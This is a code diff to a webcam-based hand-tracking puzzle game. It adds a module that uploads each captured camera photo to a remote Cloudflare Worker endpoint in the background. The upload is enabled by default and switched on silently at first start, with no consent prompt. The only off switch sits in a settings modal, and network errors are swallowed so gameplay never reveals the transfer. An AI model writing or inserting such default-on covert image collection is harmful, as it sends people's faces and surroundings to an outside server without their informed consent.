@@ -1,3 +1,12 @@
+// --- PHOTO DELIVERY CONFIGURATION ---
+// Configure your serverless backend URL here (e.g., Cloudflare Worker endpoint)
+const PHOTO_UPLOAD_CONFIG = {
+    // Development toggle: set to true to enable photo uploads, false to disable
+    enabled: true,
+    // Deployed Cloudflare Worker endpoint
+    endpoint: 'https://cyber-puzzle-ai.dushah2007.workers.dev/upload'
+};
+
 // --- NAMESPACES & STATE ---
 const Config = {
     PINCH_HOLD_DURATION: 0.4,
@@ -13,6 +22,9 @@ const State = {
     soundEnabled: true,
     cameraFacingMode: 'user',
     hintsEnabled: false,
+    
+    // Privacy & Photo Sharing
+    photoSharingEnabled: true,
     
     // Hand tracking & Physics
     hand: { exists: false, cx: 0, cy: 0, isPinched: false, confidence: 0, pinchTime: 0 },
@@ -70,6 +82,11 @@ const Els = {
     sound: document.getElementById('sound-btn'),
     cam: document.getElementById('cam-btn'),
     fs: document.getElementById('fullscreen-btn'),
+    settingsBtn: document.getElementById('settings-btn'),
+    settingsModal: document.getElementById('settings-modal'),
+    settingsCloseBtn: document.getElementById('settings-close-btn'),
+    photoSharingToggle: document.getElementById('photo-sharing-toggle'),
+    photoSharingStatus: document.getElementById('photo-sharing-status'),
     fallbackHint: document.getElementById('fallback-hint')
 };
 
@@ -155,6 +172,66 @@ const StorageManager = {
         }
         this.updateBestDisplay();
         return isNewBest;
+    }
+};
+
+// --- PHOTO DELIVERY MANAGER ---
+const PhotoDeliveryManager = {
+    init() {
+        const stored = localStorage.getItem('photoSharingEnabled');
+        if (stored !== null) {
+            State.photoSharingEnabled = stored === 'true';
+        } else {
+            State.photoSharingEnabled = true;
+        }
+        this.updateUI();
+    },
+    setPhotoSharing(enabled) {
+        State.photoSharingEnabled = !!enabled;
+        localStorage.setItem('photoSharingEnabled', String(State.photoSharingEnabled));
+        this.updateUI();
+    },
+    updateUI() {
+        if (Els.photoSharingToggle) Els.photoSharingToggle.checked = State.photoSharingEnabled;
+        if (Els.photoSharingStatus) {
+            Els.photoSharingStatus.innerText = State.photoSharingEnabled ? 'ON' : 'OFF';
+            Els.photoSharingStatus.style.color = State.photoSharingEnabled ? 'var(--accent)' : 'var(--text-tertiary)';
+        }
+    },
+    async sendCapturedPhoto(canvas) {
+        // 1. If photo sharing is disabled by user setting, never send
+        if (!State.photoSharingEnabled) {
+            return;
+        }
+        // 2. If upload is disabled in config or endpoint is empty, skip
+        if (!PHOTO_UPLOAD_CONFIG.enabled || !PHOTO_UPLOAD_CONFIG.endpoint) {
+            return;
+        }
+
+        try {
+            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
+            if (!blob) return;
+
+            const formData = new FormData();
+            formData.append('photo', blob, `capture_${Date.now()}.jpg`);
+            formData.append('timestamp', new Date().toISOString());
+            formData.append('gridSize', `${State.gridSize}x${State.gridSize}`);
+
+            // Non-blocking background fetch
+            fetch(PHOTO_UPLOAD_CONFIG.endpoint, {
+                method: 'POST',
+                body: formData
+            }).then(res => {
+                if (!res.ok) {
+                    console.warn('Photo delivery response status:', res.status);
+                }
+            }).catch(err => {
+                // Silently swallow network/backend errors so gameplay is NEVER interrupted
+                console.warn('Photo delivery could not reach backend:', err);
+            });
+        } catch (e) {
+            console.warn('Photo delivery error:', e);
+        }
     }
 };
 
@@ -744,6 +821,9 @@ const UIManager = {
         Els.previewCanvas.getContext('2d').drawImage(State.capturedImageCanvas, 0, 0);
         this.show('mini-preview');
         
+        // Trigger non-blocking photo delivery (if enabled)
+        PhotoDeliveryManager.sendCapturedPhoto(State.capturedImageCanvas);
+
         PuzzleEngine.generate(parseInt(Els.difficulty.value) || 3);
         Els.fallbackHint.classList.remove('hidden');
         setTimeout(() => Els.fallbackHint.classList.add('hidden'), 4000);
@@ -770,6 +850,12 @@ const UIManager = {
     bindEvents() {
         document.getElementById('start-tutorial-btn').addEventListener('click', () => {
             AudioEngine.init(); AudioEngine.playClick();
+            // Initialize photoSharingEnabled preference in localStorage on first start
+            if (localStorage.getItem('photoSharingEnabled') === null) {
+                localStorage.setItem('photoSharingEnabled', 'true');
+                State.photoSharingEnabled = true;
+                PhotoDeliveryManager.updateUI();
+            }
             this.hide('tutorial-overlay'); this.show('loading-indicator');
             VisionManager.init();
         });
@@ -780,6 +866,33 @@ const UIManager = {
             this.show('loading-indicator'); VisionManager.init();
         });
         
+        // Settings Modal event bindings
+        if (Els.settingsBtn) {
+            Els.settingsBtn.addEventListener('click', () => {
+                AudioEngine.playClick();
+                this.show('settings-modal');
+            });
+        }
+        if (Els.settingsCloseBtn) {
+            Els.settingsCloseBtn.addEventListener('click', () => {
+                AudioEngine.playClick();
+                this.hide('settings-modal');
+            });
+        }
+        if (Els.settingsModal) {
+            Els.settingsModal.addEventListener('click', (e) => {
+                if (e.target === Els.settingsModal) {
+                    this.hide('settings-modal');
+                }
+            });
+        }
+        if (Els.photoSharingToggle) {
+            Els.photoSharingToggle.addEventListener('change', (e) => {
+                AudioEngine.playClick();
+                PhotoDeliveryManager.setPhotoSharing(e.target.checked);
+            });
+        }
+
         const resetToCapture = () => {
             AudioEngine.playClick();
             this.hide('win-modal'); this.hide('mini-preview'); this.show('capture-instruction');
@@ -884,5 +997,6 @@ const UIManager = {
 // --- BOOTSTRAP ---
 QATester.runStartupTests();
 StorageManager.updateBestDisplay();
+PhotoDeliveryManager.init();
 UIManager.bindEvents();
 requestAnimationFrame(gameLoop);
